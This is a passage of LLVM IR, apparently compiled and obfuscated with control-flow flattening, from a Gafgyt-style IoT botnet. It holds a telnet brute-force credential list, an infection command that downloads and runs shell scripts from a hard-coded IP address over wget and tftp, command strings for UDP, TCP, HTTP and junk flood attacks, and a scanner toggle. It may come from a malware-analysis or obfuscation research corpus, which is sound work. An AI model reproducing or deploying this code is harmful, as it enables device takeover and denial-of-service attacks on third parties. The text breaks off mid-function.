; ModuleID = 'host/ir_fla/L7.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.udphdr = type { %union.anon.2 }
%union.anon.2 = type { %struct.anon.3 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.state_t = type { i32, i8 }
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@encodes = global [87 x i8] c"<>@o$:,.l+*^?=)(|AB&%;D\22!wkUxzvutsrqp_nm-ihgfFCcba~K23456789eyd1XSNQWTZMIRHGVOYLjPJE/][", align 16
@decodes = global [87 x i8] c"0123456789abcdefghijklmnopqrstuvzywxABCDEFGHIJKLMNOPQRSTUVZYWX|:. !#-/;&*'\22\0A\0D\00>$%(),?=@", align 16
@commServer = global [1 x i8*] [i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@usernames = global [7 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"login\00\00", align 1
@.str.6 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@passwords = global [14 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.14, i32 0, i32 0)], align 16
@.str.7 = private unnamed_addr constant [6 x i8] c"toor\00\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@.str.9 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.10 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.12 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.13 = private unnamed_addr constant [6 x i8] c"pass\00\00", align 1
@.str.14 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.88 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.15 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.16 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.17 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.18 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.19 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.20 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.21 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.22 = private unnamed_addr constant [10 x i8] c"recv: %s\0A\00", align 1
@.str.23 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@ipState = internal global [5 x i8] zeroinitializer, align 1
@.str.24 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.25 = private unnamed_addr constant [11 x i8] c"%d.%d.%d.0\00", align 1
@.str.26 = private unnamed_addr constant [6 x i8] c"ogin:\00", align 1
@.str.27 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.28 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.29 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.31 = private unnamed_addr constant [266 x i8] c"cd /tmp; wget http://212.59.241.174/bins.sh; chmod 777 bins.sh; sh bins.sh; busybox tftp 212.59.241.174 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 212.59.241.174; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh\0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [50 x i8] c"/bin/busybox;echo -e '\5C147\5C141\5C171\5C146\5C147\5C164'\0D\0A\00", align 1
@.str.33 = private unnamed_addr constant [7 x i8] c"gayfgt\00", align 1
@.str.34 = private unnamed_addr constant [11 x i8] c"multi-call\00", align 1
@.str.35 = private unnamed_addr constant [16 x i8] c"REPORT %s:%s:%s\00", align 1
@.str.36 = private unnamed_addr constant [14 x i8] c"REPORT %s:%s:\00", align 1
@.str.37 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.38 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.39 = private unnamed_addr constant [18 x i8] c"wget -O /tmp/fff \00", align 1
@.str.40 = private unnamed_addr constant [14 x i8] c" > /dev/null \00", align 1
@.str.41 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.42 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.43 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.44 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.45 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.46 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.47 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.48 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.49 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.50 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.51 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.52 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.53 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.54 = private unnamed_addr constant [17 x i8] c"SCANNER ON | OFF\00", align 1
@.str.55 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.56 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.57 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.58 = private unnamed_addr constant [36 x i8] c"HOLD Flooding %s:%d for %d seconds.\00", align 1
@.str.59 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.60 = private unnamed_addr constant [36 x i8] c"JUNK Flooding %s:%d for %d seconds.\00", align 1
@.str.61 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.62 = private unnamed_addr constant [32 x i8] c"UDP Flooding %s for %d seconds.\00", align 1
@.str.63 = private unnamed_addr constant [35 x i8] c"UDP Flooding %s:%d for %d seconds.\00", align 1
@.str.64 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.65 = private unnamed_addr constant [33 x i8] c"HTTP Flooding %s for %d seconds.\00", align 1
@.str.66 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.67 = private unnamed_addr constant [32 x i8] c"TCP Flooding %s for %d seconds.\00", align 1
@.str.68 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.69 = private unnamed_addr constant [11 x i8] c"Killed %d.\00", align 1
@.str.70 = private unnamed_addr constant [13 x i8] c"None Killed.\00", align 1
@.str.71 = private unnamed_addr constant [10 x i8] c"LOLNOGTFO\00", align 1
@.str.72 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.73 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.74 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.75 = private unnamed_addr constant [7 x i8] c"GAYFGT\00", align 1
@.str.76 = private unnamed_addr constant [36 x i8] c"MAC: %02X:%02X:%02X:%02X:%02X:%02X\0A\00", align 1
@.str.77 = private unnamed_addr constant [13 x i8] c"fork failed\0A\00", align 1
@.str.78 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.79 = private unnamed_addr constant [22 x i8] c"Failed to connect...\0A\00", align 1
@.str.80 = private unnamed_addr constant [9 x i8] c"BUILD %s\00", align 1
@.str.81 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.82 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.83 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.84 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.85 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.86 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.87 = private unnamed_addr constant [24 x i8] c"Link closed by server.\0A\00", align 1

; Function Attrs: noinline nounwind uwtable
define i8* @encode(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca [512 x i8], align 16
  %7 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %8 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %8, i8 0, i64 512, i32 16, i1 false)
  %switchVar = alloca i32
  store i32 -1165503809, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1165503809, label %9
    i32 -1525935581, label %16
    i32 53554861, label %17
    i32 1036047387, label %22
    i32 1180582781, label %36
    i32 -849330606, label %46
    i32 1364833879, label %47
    i32 -422320545, label %50
    i32 -1298060341, label %53
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %3, align 4
  %11 = sext i32 %10 to i64
  %12 = load i8*, i8** %2, align 8
  %13 = call i64 @strlen(i8* %12) #10
  %14 = icmp ult i64 %11, %13
  %15 = select i1 %14, i32 -1525935581, i32 -1298060341
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 53554861, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load i32, i32* %5, align 4
  %19 = sext i32 %18 to i64
  %20 = icmp ule i64 %19, 87
  %21 = select i1 %20, i32 1036047387, i32 -422320545
  store i32 %21, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i8*, i8** %2, align 8
  %24 = load i32, i32* %3, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i8, i8* %26, align 1
  %28 = sext i8 %27 to i32
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [87 x i8], [87 x i8]* @decodes, i64 0, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %28, %33
  %35 = select i1 %34, i32 1180582781, i32 -849330606
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %5, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds [87 x i8], [87 x i8]* @encodes, i64 0, i64 %38
  %40 = load i8, i8* %39, align 1
  %41 = load i32, i32* %4, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 %42
  store i8 %40, i8* %43, align 1
  %44 = load i32, i32* %4, align 4
  %45 = add nsw i32 %44, 1
  store i32 %45, i32* %4, align 4
  store i32 -849330606, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 1364833879, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i32, i32* %5, align 4
  %49 = add nsw i32 %48, 1
  store i32 %49, i32* %5, align 4
  store i32 53554861, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i32, i32* %3, align 4
  %52 = add nsw i32 %51, 1
  store i32 %52, i32* %3, align 4
  store i32 -1165503809, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = load i32, i32* %4, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 %55
  store i8 0, i8* %56, align 1
  %57 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i32 0, i32 0
  %58 = call noalias i8* @strdup(i8* %57) #4
  store i8* %58, i8** %7, align 8
  %59 = load i8*, i8** %7, align 8
  ret i8* %59

loopEnd:                                          ; preds = %50, %47, %46, %36, %22, %17, %16, %9, %switchDefault
  br label %loopEntry
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #1

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind
declare noalias i8* @strdup(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i8* @decode(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca [512 x i8], align 16
  %7 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %8 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %8, i8 0, i64 512, i32 16, i1 false)
  %switchVar = alloca i32
  store i32 -134825322, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -134825322, label %9
    i32 1566699866, label %16
    i32 -1781170510, label %17
    i32 -1746900638, label %22
    i32 -1901023985, label %36
    i32 1593712774, label %46
    i32 -875126068, label %47
    i32 -945537373, label %50
    i32 455649215, label %53
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %3, align 4
  %11 = sext i32 %10 to i64
  %12 = load i8*, i8** %2, align 8
  %13 = call i64 @strlen(i8* %12) #10
  %14 = icmp ult i64 %11, %13
  %15 = select i1 %14, i32 1566699866, i32 455649215
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -1781170510, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load i32, i32* %5, align 4
  %19 = sext i32 %18 to i64
  %20 = icmp ule i64 %19, 87
  %21 = select i1 %20, i32 -1746900638, i32 -945537373
  store i32 %21, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i8*, i8** %2, align 8
  %24 = load i32, i32* %3, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i8, i8* %26, align 1
  %28 = sext i8 %27 to i32
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [87 x i8], [87 x i8]* @encodes, i64 0, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %28, %33
  %35 = select i1 %34, i32 -1901023985, i32 1593712774
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %5, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds [87 x i8], [87 x i8]* @decodes, i64 0, i64 %38
  %40 = load i8, i8* %39, align 1
  %41 = load i32, i32* %4, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 %42
  store i8 %40, i8* %43, align 1
  %44 = load i32, i32* %4, align 4
  %45 = add nsw i32 %44, 1
  store i32 %45, i32* %4, align 4
  store i32 1593712774, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 -875126068, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i32, i32* %5, align 4
  %49 = add nsw i32 %48, 1
  store i32 %49, i32* %5, align 4
  store i32 -1781170510, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i32, i32* %3, align 4
  %52 = add nsw i32 %51, 1
  store i32 %52, i32* %3, align 4
  store i32 -134825322, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = load i32, i32* %4, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 %55
  store i8 0, i8* %56, align 1
  %57 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i32 0, i32 0
  %58 = call noalias i8* @strdup(i8* %57) #4
  store i8* %58, i8** %7, align 8
  %59 = load i8*, i8** %7, align 8
  ret i8* %59

loopEnd:                                          ; preds = %50, %47, %46, %36, %22, %17, %16, %9, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  %switchVar = alloca i32
  store i32 523523379, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 523523379, label %10
    i32 -1955518778, label %14
    i32 -65201315, label %32
    i32 1284094047, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  %13 = select i1 %12, i32 -1955518778, i32 1284094047
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i32, i32* %3, align 4
  %16 = sub nsw i32 %15, 3
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %17
  %19 = load i32, i32* %18, align 4
  %20 = load i32, i32* %3, align 4
  %21 = sub nsw i32 %20, 2
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %22
  %24 = load i32, i32* %23, align 4
  %25 = xor i32 %19, %24
  %26 = xor i32 %25, -1640531527
  %27 = load i32, i32* %3, align 4
  %28 = xor i32 %26, %27
  %29 = load i32, i32* %3, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %30
  store i32 %28, i32* %31, align 4
  store i32 -65201315, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i32, i32* %3, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* %3, align 4
  store i32 523523379, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %32, %14, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %.reg2mem2 = alloca i32
  %.reg2mem = alloca i32
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  store i32 %26, i32* %.reg2mem
  %27 = load i32, i32* @c, align 4
  store i32 %27, i32* %.reg2mem2
  %switchVar = alloca i32
  store i32 -1089882500, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1089882500, label %first
    i32 834975610, label %30
    i32 -1481409968, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %.reload3 = load volatile i32, i32* %.reg2mem2
  %28 = icmp ult i32 %.reload, %.reload3
  %29 = select i1 %28, i32 834975610, i32 -1481409968
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32, i32* %3, align 4
  %32 = add i32 %31, 1
  store i32 %32, i32* %3, align 4
  %33 = load i32, i32* @c, align 4
  %34 = add i32 %33, 1
  store i32 %34, i32* @c, align 4
  store i32 -1481409968, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %4, align 4
  %37 = load i32, i32* %3, align 4
  %38 = sub i32 %36, %37
  %39 = load i32, i32* @rand_cmwc.i, align 4
  %40 = zext i32 %39 to i64
  %41 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %40
  store i32 %38, i32* %41, align 4
  ret i32 %38

loopEnd:                                          ; preds = %30, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  %switchVar = alloca i32
  store i32 -1514576878, i32* %switchVar
  %.reg2mem = alloca i1
